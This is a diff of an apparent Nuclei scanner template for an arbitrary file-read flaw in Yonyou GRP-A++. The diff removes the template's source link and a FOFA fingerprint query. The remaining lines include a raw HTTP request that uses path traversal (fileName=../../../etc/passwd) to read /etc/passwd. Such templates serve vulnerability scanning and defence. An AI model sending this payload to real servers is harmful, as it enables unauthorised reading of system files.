@@ -3,12 +3,8 @@ info:
   name: 用友GRP-A++ downloadfileName任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pbox9tr7q94gacim'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pbox9tr7q94gacim
-    fofa: body="/pf/portal/login/css/fonts/style.css"
 http:
 - raw:
   - 'GET /ma/emp/maEmp/download?fileName=../../../etc/passwd HTTP/1.1
